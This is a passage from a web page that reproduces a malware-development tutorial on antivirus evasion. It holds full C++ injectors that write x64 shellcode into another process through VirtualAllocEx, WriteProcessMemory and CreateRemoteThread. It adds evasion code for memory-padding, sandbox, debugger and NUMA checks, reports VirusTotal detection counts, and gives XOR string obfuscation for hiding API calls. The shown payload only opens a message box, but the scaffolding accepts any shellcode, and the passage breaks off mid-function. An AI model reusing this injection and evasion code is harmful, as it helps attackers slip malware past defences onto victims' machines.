+int main(int argc, char* argv[]) {
+// 64-bit meow-meow messagebox without encryption
+unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+PVOID rb; // remote buffer
+// parse process ID
+printf("PID: %i", atoi(argv[1]));
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
+DWORD(atoi(argv[1])));
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
+(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+// "copy" data between processes
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+// our process start new thread
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb,
+NULL, 0, NULL);
+CloseHandle(ph);
+return 0;
+}
+This is classic variant, we define payload, allocate memory, copy into the new buffer,
+and then execute it.
+The main limit with AV scanner is the amount of time they can spend on each file.
+During a regular system scan, AV will have to analyze thousands of files. It just cannot
+spend too much time or power on a peculiar one. One of the “classic” AV evasion trick</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">besides payload encryption: we just allocate and fill 100MB of memory:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">char *mem = NULL; mem = (char *) malloc(100000000);</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">if (mem != NULL) {
+memset(mem, 00, 100000000);
+free(mem);
+//... run our malicious logic
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, let’s go to update our simple malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+classic payload injection example
+allocate too much memory
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/12/21/simple-malware-av-evasion-3.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+int main(int argc, char* argv[]) {
+// meow-meow messagebox x64 windows
+unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+PVOID rb; // remote buffer
+DWORD pid; // process ID
+pid = atoi(argv[1]);
+// allocate and fill 100 MB of memory
+char *mem = NULL;
+mem = (char *) malloc(100000000);
+if (mem != NULL) {
+memset(mem, 00, 100000000);
+free(mem);
+// parse process ID
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
+DWORD(pid));
+printf("PID: %i", pid);
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
+(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+// "copy" data between processes
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+// our process start new thread
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb,
+NULL, 0, NULL);
+CloseHandle(ph);
+return 0;
+}
+}
+Let’s go to compile:
+x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fdata-sections \
+-Wno-write-strings -fno-exceptions \
+
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive
+
+And run it in our victim’s machine (Windows 10 x64):
+
+As you can see everything is worked perfectly :)</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And if we just upload this malware to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/4ff68b6ca99638342b9b316439594c21520e66fe ca36c2447e3cc75ad3d70f46/detection So, 6 of 67 AV engines detect our file as malicious.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. And what’s next? Malwares often use various methods to fingerprint the environment they’re being executed in and perform different actions based on the situation. For example, we can detect virtualized environment. Sandboxes and analyst’s virtual machines usually can’t 100% accurately emulate actual execution environment. Nowadays typical user machine has a processor with at least 2 cores and has a minimum 2GB RAM. So our malware can verify if the environment is a subject to these constraints: BOOL checkResources() { SYSTEM_INFO s; MEMORYSTATUSEX ms;</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">DWORD procNum;
+DWORD ram;
+// check number of processors
+GetSystemInfo(&amp;s);
+procNum = s.dwNumberOfProcessors;
+if (procNum &lt; 2) return false;
+// check RAM
+ms.dwLength = sizeof(ms);
+GlobalMemoryStatusEx(&amp;ms);
+ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
+if (ram &lt; 2) return false;
+return true;
+}
+Also we’ll invoke the VirtualAllocExNuma() API call. This is an alternative version
+of VirtualAllocEx() that is meant to be used by systems with more than one physical
+CPU:
+typedef LPVOID (WINAPI * pVirtualAllocExNuma) (
+HANDLE
+hProcess,
+LPVOID
+lpAddress,
+SIZE_T
+dwSize,
+DWORD
+flAllocationType,
+DWORD
+flProtect,
+DWORD
+nndPreferred
+);
+// memory allocation work on regular PC
+// but will fail in AV emulators
+BOOL checkNUMA() {
+LPVOID mem = NULL;
+
+pVirtualAllocExNuma myVirtualAllocExNuma =
+(pVirtualAllocExNuma)GetProcAddress(
+GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
+mem = myVirtualAllocExNuma(GetCurrentProcess(),
+NULL, 1000, MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE, 0);
+if (mem != NULL) {
+return false;
+} else {
+return true;
+}
+}
+//...
+What we’re doing here is trying to allocate memory with VirtualAllocExNuma(),</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and if it fails we just exit immediately. Otherwise, execution will continue. Since the code is emulated it is not started in a process which has the name of the binary file. That’s why we check that first argument contains name of the file:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// what is my name???
+if (strstr(argv[0], "hack2.exe") == NULL) {
+printf("What's my name? WTF?? :(\n");
+return -2;
+}
+It’s possible to simply “ask” the operating system if any debugger is attached.
+IsDebuggerPresent function basically checks BeingDebugged flag in the PEB:
+// "ask" the OS if any debugger is present
+if (IsDebuggerPresent()) {
+printf("attached debugger detected :(\n");
+return -2;
+}
+Dynamic malware analysis - or sandboxing - has become the centerpiece of any major
+security solution. At the same time, almost all variants of current threats include some
+kind of sandbox detection logic.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So we can try to combine all this tricks (hac2.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+hack.cpp
+classic payload injection example
+allocate too much memory
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/12/21/simple-malware-av-evasion-3.html
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;memoryapi.h&gt;
+typedef LPVOID (WINAPI * pVirtualAllocExNuma) (
+HANDLE
+hProcess,
+LPVOID
+lpAddress,
+SIZE_T
+dwSize,
+DWORD
+flAllocationType,
+DWORD
+flProtect,
+DWORD
+nndPreferred
+);
+// memory allocation work on regular PC
+// but will fail in AV emulators
+BOOL checkNUMA() {
+LPVOID mem = NULL;
+pVirtualAllocExNuma myVirtualAllocExNuma =
+(pVirtualAllocExNuma)GetProcAddress(
+GetModuleHandle("kernel32.dll"),
+"VirtualAllocExNuma");
+mem = myVirtualAllocExNuma(GetCurrentProcess(),
+NULL, 1000, MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE, 0);
+if (mem != NULL) {
+return false;
+} else {
+return true;
+}
+}
+// resource check
+BOOL checkResources() {
+SYSTEM_INFO s;
+MEMORYSTATUSEX ms;
+DWORD procNum;
+DWORD ram;
+// check number of processors
+GetSystemInfo(&amp;s);
+procNum = s.dwNumberOfProcessors;
+if (procNum &lt; 2) return false;
+// check RAM
+
+ms.dwLength = sizeof(ms);
+GlobalMemoryStatusEx(&amp;ms);
+ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
+if (ram &lt; 2) return false;
+return true;
+}
+int main(int argc, char* argv[]) {
+// meow-meow messagebox x64 windows
+unsigned char my_payload[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+PVOID rb; // remote buffer
+DWORD pid; // process ID
+pid = atoi(argv[1]);
+// what is my name???
+if (strstr(argv[0], "hack2.exe") == NULL) {
+printf("What's my name? WTF?? :(\n");
+
+return -2;
+}
+// "ask" the OS if any debugger is present
+if (IsDebuggerPresent()) {
+printf("attached debugger detected :(\n");
+return -2;
+}
+// check NUMA
+if (checkNUMA()) {
+printf("NUMA memory allocate failed :( \n");
+return -2;
+}
+// check resources
+if (checkResources() == false) {
+printf("possibly launched in sandbox :(\n");
+return -2;
+}
+// allocate and fill 100 MB of memory
+char *mem = NULL;
+mem = (char *) malloc(100000000);
+if (mem != NULL) {
+memset(mem, 00, 100000000);
+free(mem);
+// parse process ID
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
+DWORD(pid));
+printf("PID: %i", pid);
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
+(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+// "copy" data between processes
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+// our process start new thread
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb,
+NULL, 0, NULL);
+
+CloseHandle(ph);
+return 0;
+}
+}
+Let’s go to compile:
+
+and run in our victim’s machine (Windows 10 x64):
+
+As you can see, our malicious logic did not start as we are in a virtual machine with 1
+core CPU.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload this variant to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/5658fd8d326dcbb01492c0d5644cdeb69dc8d64a cbf939a91b25a3caa53f7a61/detection So, 8 of 67 AV engines detect our file as malicious. As usually, for better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. To conclude these examples show it is pretty simple to bypass AV when you exploit their weaknesses. It only requires some knowledge on windows system and how AV works. Also we can try to detect devices and vendor names of our machine, search VM-specific artifacts, check file, process or windows names, check screen resolution, etc. I will show these techniques and real examples in the future in separate posts. I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. The Antivirus Hacker’s Handbook Wikileaks - Bypass AV Dynamic Analysis DeepSec 2013 Talk: The Joys of Detecting Malicious Software IsDebuggerPresent VirtualAllocExNuma NUMA Support Source code on Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">57. AV engines evasion techniques - part 4. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a result of self-researching another AV evasion trick. An example how to bypass AV engines in simple C++ malware. This trick regarding how you hide your windows API calls from static analysis. When you want to interact with the windows operating system, then you need to call windows API for example from user32.dll from your code such as MessageBoxA or any other API. If you specify the calls from your code, then the compiler will include the MessageBoxA or all the API’s needed in the import table in your PE. it would give ideas for the malware analyst for more closely investigate you malware.</p>
+
+            <div id="what-is-ordinals" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>What is ordinals?</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Each function exported by a DLL is identified by a numeric ordinal and optionally a name. Likewise, functions can be imported from a DLL either by ordinal or by name. The ordinal represents the position of the function’s address pointer in the DLL Export Address table. In one of my posts I wrote a simple python script which enumerates the exported functions from the provided DLL (dll-def.py):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">import pefile
+import sys
+import os.path
+dll = pefile.PE(sys.argv[1])
+dll_basename = os.path.splitext(sys.argv[1])[0]
+try:
+with open(sys.argv[1]
+.split("/")[-1]
+
+.replace(".dll", ".def"), "w") as f:
+f.write("EXPORTS\n")
+for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
+if export.name:
+f.write(
+'{}={}.{} @{}\n'.format(
+export.name.decode(),
+dll_basename,
+export.name.decode(),
+export.ordinal))
+except:
+print ("failed to create .def file :(")
+else:
+print ("successfully create .def file :)")</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to run it for user32.dll:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 dll-def.py user32.dll</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, for example, for MessageBoxA ordinal is 2039, for MessageBoxW ordinal is 2046. practical example. Let’s go to look at the practical example. The ordinals might change on each release of the dll. We do not hardcode it in our code. We need to look up the ordinals by iterating the list and make a string comparison. This activity is counterproductive to our objective to hide the API name in our code since we need to make a string comparison during the lookup. This technique is very simple. First of all, I used a trick from my post (also included to this book):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>x64 Assembly</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-nasm">// encrypted function name (MessageBoxA)
+unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2,
+0x17, 0x31, 0xa, 0x1b, 0x33 };
+
+// encrypted module name (user32.dll)
+unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43,
+0x57, 0x5c, 0x17, 0x9, 0xf };
+// key
+char s_key[] = "mysupersecretkey";
+// XOR decrypt
+void XOR(char * data, size_t data_len, char * key,
+size_t key_len) {
+int j;
+j = 0;
+for (int i = 0; i &lt; data_len; i++) {
+if (j == key_len - 1) j = 0;
+data[i] = data[i] ^ key[j];
+j++;
+}
+}
+And use python script to XOR encrypt our function name:
+import sys
+import os
+import hashlib
+import string
+## XOR function to encrypt data
+def xor(data, key):
+key = str(key)
+l = len(key)
+output_str = ""
+for i in range(len(data)):
+current = data[i]
+current_key = key[i % len(key)]
+ordd = lambda x: x if isinstance(x, int) else ord(x)
+output_str += chr(ordd(current) ^ ord(current_key))
+return output_str
+## encrypting
+def xor_encrypt(data, key):
+ciphertext = xor(data, key)
+ciphertext = '{ 0x' + ', 0x'.
+join(hex(ord(x))[2:] for x in ciphertext) + ' };'
+print (ciphertext)
+return ciphertext, key
+
+## key for encrypt/decrypt
+my_secret_key = "mysupersecretkey"
+ciphertext, p_key = xor_encrypt("user32.dll",
+my_secret_key)
+ciphertext, p_key = xor_encrypt("MessageBoxA",
+my_secret_key)</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So in our case, we encrypt user32.dll and MessageBoxA strings. In general, we use the Name Pointer Table (NPT) and Export Ordinal Table (EOT) to find export ordinals. So I used function for get export directory table:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// get export directory table
+PIMAGE_EXPORT_DIRECTORY getEDT(HMODULE module) {
+PBYTE base; // base address of module
+PIMAGE_FILE_HEADER img_file_header; // COFF file header
+PIMAGE_EXPORT_DIRECTORY edt; // export directory table
+DWORD rva; // relative virtual address of EDT
+PIMAGE_DOS_HEADER img_dos_header; // MS-DOS stub
+PIMAGE_OPTIONAL_HEADER img_opt_header; // "optional" header
+PDWORD sig; // PE signature
+// Start at the base of the module.
+// The MS-DOS stub begins there.
+base = (PBYTE)module;
+img_dos_header = (PIMAGE_DOS_HEADER)module;
+// Get the PE signature and verify it.
+sig = (DWORD*)(base + img_dos_header-&gt;e_lfanew);
+if (IMAGE_NT_SIGNATURE != *sig) {
+// bad signature -- invalid image or module handle
+return NULL;
+}
+// Get the COFF file header.
